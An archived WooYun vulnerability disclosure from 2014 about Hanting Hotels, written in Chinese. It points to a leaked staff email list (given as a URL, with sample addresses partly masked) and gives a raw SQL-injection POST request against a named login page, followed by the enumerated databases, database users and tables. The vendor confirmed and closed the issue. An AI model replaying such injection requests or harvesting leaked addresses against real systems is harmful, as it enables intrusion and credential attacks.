<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		汉庭酒店某处信息泄漏&amp;Post注入一枚  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		汉庭酒店某处信息泄漏&amp;Post注入一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/U神">U神</a> 
</li><li>提交时间：		2014-03-14 22:18</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-03-14：	细节已通知厂商并且等待厂商处理中<br/>
									2014-03-15：	厂商已经确认，细节仅向厂商公开<br/>
									2014-03-25：	细节向核心白帽子及相关领域专家公开<br/>
									2014-04-04：	细节向普通白帽子公开<br/>
									2014-04-14：	细节向实习白帽子公开<br/>
									2014-04-28：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail"></p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">#1.信息泄漏：这里泄漏了大量的用户Email用户名，6MB的TXT文档，通过收集这些用户名可以进行后台的爆破，因为后台没有验证码与错误登录次数限制。<br />
<br />
</p><pre><code>http://jcxt.htinns.com/mail.txt</code></pre><p class='detail'><br />
<br />
</p><p class="detail"><a href="../images/29102830241cddb72f0d29db37df5ce2a236e2e2.png" target="_blank"><img src="../images/29102830241cddb72f0d29db37df5ce2a236e2e2.png" alt="QQ截图20140429102736.png" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/2922354525d9dad06c8f061c230f9f6e06241ac0.png" target="_blank"><img src="../images/2922354525d9dad06c8f061c230f9f6e06241ac0.png" alt="QQ截图20140429223510.png" width="600"/></a></p><p class="detail"><br />
<br />
以下列举个别：<br />
<br />
</p><pre><code>l**ng@htinns.com<br />
ts***@htinns.com<br />
t***n@htinns.com<br />
h***n@htinns.com<br />
xu***ng@htinns.com<br />
w***ia@htinns.com<br />
l***@htinns.com<br />
k***o@htinns.com<br />
y****@htinns.com<br />
b****@htinns.com<br />
h****@htinns.com<br />
h****@htinns.com<br />
x****g@htinns.com<br />
y****li@htinns.com<br />
d****n@htinns.com<br />
z**@htinns.com<br />
d****g@htinns.com<br />
t****@htinns.com<br />
c****u@htinns.com<br />
f****g@htinns.com<br />
l****g@htinns.com<br />
w****o@htinns.com<br />
y****g@htinns.com<br />
s****o@htinns.com<br />
c**@htinns.com<br />
z****na@htinns.com<br />
l****@htinns.com<br />
x**u@htinns.com<br />
x**ng@htinns.com</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">#2.Post注入一枚：<br />
<br />
<br />
<br />
</p><pre><code>POST /exam2/login.asp?win= HTTP/1.1<br />
Host: training.htinns.com<br />
Proxy-Connection: keep-alive<br />
Content-Length: 36<br />
Cache-Control: max-age=0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />
Origin: http://training.htinns.com<br />
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36<br />
Content-Type: application/x-www-form-urlencoded<br />
Referer: http://training.htinns.com/exam2/<br />
Accept-Encoding: gzip,deflate,sdch<br />
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4<br />
Cookie: Hm_lvt_e5770a47472445b3f839a58a32b8abe5=1394799212; Hm_lpvt_e5770a47472445b3f839a58a32b8abe5=1394799385; ASPSESSIONIDCSAQQQQQ=APGAMJPALKBMAOBPDBGIMADM; id=admin%27; %2Fbbs%2FGROUP=1<br />
<br />
username=admin&amp;password=admin&amp;czbz=1</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>available databases [48]:<br />
[*] Application_Registry_Service_DB_5d9281593cab42dc8320efcf7cbfd7a0<br />
[*] Bdc_Service_DB_17fc7e4144144d30bf092d46962cf618<br />
[*] dbcenter<br />
[*] dnt31<br />
[*] eCell6<br />
[*] Exam1<br />
[*] HT_eProcurement<br />
[*] HTFranchisee<br />
[*] HtinnsAdviser<br />
[*] HTIntranetUAT<br />
[*] HTScore<br />
[*] InnInspection<br />
[*] InspectionAudit<br />
[*] Managed Metadata Service_eb3ad9498f3c4d538c1c638c92230972<br />
[*] master<br />
[*] model<br />
[*] msdb<br />
[*] OA<br />
[*] PerformancePoint Service Application_1e41da1b1ab64e55b59c496da2baa509<br />
[*] PnCheck<br />
[*] PurchaseSurvey<br />
[*] RCTIDB<br />
[*] ReportServer<br />
[*] ReportServerTempDB<br />
[*] ROOMCHK<br />
[*] Search_Service_Application_CrawlStoreDB_a4e0258f3e8d475dbc9ae62b373ce475<br />
[*] Search_Service_Application_DB_e90bd9a6f93d43c294e41402b5d631e9<br />
[*] Search_Service_Application_PropertyStoreDB_bda79800fee24b8691db0032d6ceccb<br />
[*] Secure_Store_Service_DB_b62005406e8a4f12a854cb5a434821f4<br />
[*] SharePoint_AdminContent_5947d722-6796-4bc7-ae44-1c894454c1f5<br />
[*] SharePoint_Config<br />
[*] slam<br />
[*] StateService_23c5611220344b52bea83c8d6fd7ddc8<br />
[*] tempdb<br />
[*] test<br />
[*] User Profile Service Application_ProfileDB_cb8f9f4b3ec14f0ea7f125fe176a4e0<br />
[*] User Profile Service Application_SocialDB_6bd18e2e80804b86bc5687f722d780ab<br />
[*] User Profile Service Application_SyncDB_c8c90e3cd266442f83f260c4b75ad735<br />
[*] USERPLUS<br />
[*] VHArchives_HanTing<br />
[*] WebAnalyticsService????_ReportingDB_7dc7dc51-0f26-49e6-8b74-9187ccdf0186<br />
[*] WebAnalyticsService????_StagingDB_458c6a10-f5c4-4756-a2d6-010eb6805b43<br />
[*] WordAutomationServices_04a084d97a3d4f83af4b3667b5385333<br />
[*] WSS_Content<br />
[*] WSS_Content_90<br />
[*] WSS_Content_b3117e51d8c8405888a80388555ec208<br />
[*] WSS_Logging<br />
[*] YunYing</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>database management system users [2]:<br />
[*] PowerExamUser<br />
[*] sa</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>Database: Exam1<br />
[41 tables]<br />
+--------------------+<br />
| dbo.BbsClass       |<br />
| dbo.BbsMain        |<br />
| dbo.Cjdxm          |<br />
| dbo.Denglu         |<br />
| dbo.Fenzu          |<br />
| dbo.Fenzu_Renyuan  |<br />
| dbo.Ftp_Cs         |<br />
| dbo.Ftp_Kc         |<br />
| dbo.Glyftpqx       |<br />
| dbo.ImgKu          |<br />
| dbo.Kaoshi_Detail  |<br />
| dbo.Kaoshi_Master  |<br />
| dbo.Kaoshi_daan    |<br />
| dbo.Kc_Main        |<br />
| dbo.Kc_Ren         |<br />
| dbo.Kc_lb          |<br />
| dbo.Ksj_Cl         |<br />
| dbo.Ksj_Cl_Temp    |<br />
| dbo.Ksj_Gd_Detail  |<br />
| dbo.Ksj_Main       |<br />
| dbo.Ksj_Ren        |<br />
| dbo.Mrfz           |<br />
| dbo.OperLog        |<br />
| dbo.Reninfoset     |<br />
| dbo.Renyuan        |<br />
| dbo.RenyuanInfo    |<br />
| dbo.ScoreView      |<br />
| dbo.Sjglqx         |<br />
| dbo.TZ             |<br />
| dbo.TiKu_Detail    |<br />
| dbo.Tiku_Main      |<br />
| dbo.Tkj            |<br />
| dbo.Tkjgl          |<br />
| dbo.Tmlb           |<br />
| dbo.Txfs           |<br />
| dbo.Txsx           |<br />
| dbo.Txxz           |<br />
| dbo.UserExamRecord |<br />
| dbo.Userinfo       |<br />
| dbo.Zhsz           |<br />
| dbo.dtproperties   |<br />
+--------------------+</code></pre><p class='detail'> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"> </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/U神" title="U神">U神</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-053667" title="汉庭酒店某处信息泄漏&amp;Post注入一枚">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：15 </p>
													<p class="detail">确认时间：2014-03-15 16:32</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢关注！已转送相关团队进行跟进，谢谢!</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

																	<p class="detail">2014-04-09：漏洞已关闭，谢谢！</p>
											

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="53667";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
